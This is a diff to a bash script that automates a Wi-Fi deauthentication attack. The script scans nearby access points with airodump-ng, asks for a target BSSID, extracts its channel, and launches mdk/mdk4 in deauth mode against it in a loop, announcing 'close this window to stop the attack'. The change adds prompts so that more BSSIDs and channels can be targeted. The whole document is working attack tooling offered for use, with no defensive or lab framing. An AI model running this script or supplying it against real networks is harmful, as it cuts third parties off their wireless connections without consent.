@@ -1,7 +1,5 @@
 #!/usr/bin/env bash
 
-#download and install that driver for optimal performance https://github.com/aircrack-ng/rtl8812au/tree/v5.6.4.1
-
 pkill airodump
 pkill xterm
 pkill mdk
@@ -24,17 +22,15 @@ xterm -hold -e "airodump-ng -w scan --output-format csv -M $airodump_interface" 
 read -rp "copy paste bssid you want to deauth: " bssid_target
 echo "$bssid_target" > bl.txt
 mdk_channel=$(grep "$bssid_target" -m1 scan-01.csv | cut -d "," -f 4 | awk '{$1=$1};1')
-#echo "if you want to target more bssid copy paste them here"
-#xterm -e "nano bl.txt"
-#read -rp "choose channel for mdk deauth: " mdk_channel
-#echo "$mdk_channel" > mdk_chan.txt
-#echo "if you want you can enter more channels here seperated with comma"
+echo "$mdk_channel" > mdk_chan.txt
+echo "if you want to target more bssid copy paste them here"
+xterm -e "nano bl.txt"
+echo "if you want you can enter more channels here seperated with comma"
+xterm -e "nano mdk_chan.txt"
 pkill xterm
 airmon-ng start "$mdk_interface" > /dev/null 2>&1
-#xterm -e "nano mdk_chan.txt"
 xterm -e "$mdk $mdk_interface d -b bl.txt -c $mdk_channel" &
 echo "close this window to stop the attack"
-#xterm -e "mdk4 $mdk_interface d -b bl.txt -c $mdk_channel" &
 
 while true; do
 	xterm -e "airodump-ng -w a --output-format csv -d $bssid_target $airodump_interface" &
